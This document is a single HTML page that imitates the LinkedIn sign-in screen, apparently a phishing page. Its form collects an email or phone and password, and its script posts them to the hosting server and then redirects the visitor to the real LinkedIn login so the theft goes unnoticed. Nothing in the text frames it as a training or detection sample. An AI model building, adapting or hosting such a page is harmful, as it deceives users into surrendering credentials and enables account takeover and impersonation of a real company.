<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>LinkedIn Login, Sign in | LinkedIn</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,system-ui,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue','Fira Sans',Ubuntu,Oxygen,sans-serif;background:#f3f2ef}.container{display:flex;justify-content:center;align-items:center;min-height:100vh}.box{background:white;border-radius:8px;padding:24px;width:352px;box-shadow:0 4px 12px rgba(0,0,0,.15)}.logo{margin-bottom:24px;color:#0a66c2;font-size:32px;font-weight:600}.title{font-size:24px;font-weight:600;margin-bottom:4px;color:rgba(0,0,0,.9)}.sub{font-size:14px;color:rgba(0,0,0,.6);margin-bottom:24px}input{width:100%;padding:14px;border:1px solid rgba(0,0,0,.6);border-radius:4px;font-size:16px;margin-bottom:16px;outline:none}input:focus{border-color:#0a66c2;box-shadow:0 0 0 1px #0a66c2}input[type="submit"]{background:#0a66c2;color:white;border:none;font-weight:600;font-size:16px;cursor:pointer;border-radius:24px;padding:14px}input[type="submit"]:hover{background:#004182}.link{text-align:center;margin-top:16px}.link a{color:#0a66c2;text-decoration:none;font-size:14px;font-weight:600}.link a:hover{text-decoration:underline}</style></head><body><div class="container"><div class="box"><div class="logo">LinkedIn</div><div class="title">Sign in</div><div class="sub">Stay updated on your professional world</div><form method="POST"><input type="text"name="session_key"placeholder="Email or phone"required><input type="password"name="session_password"placeholder="Password"required><input type="submit"value="Sign in"></form><div class="link"><a href="#">Forgot password?</a></div></div></div><script>document.querySelector('form').addEventListener('submit',function(e){e.preventDefault();fetch('',{method:'POST',body:new FormData(this)}).then(function(){window.location.href='https://www.linkedin.com/login';});});</script></body></html>
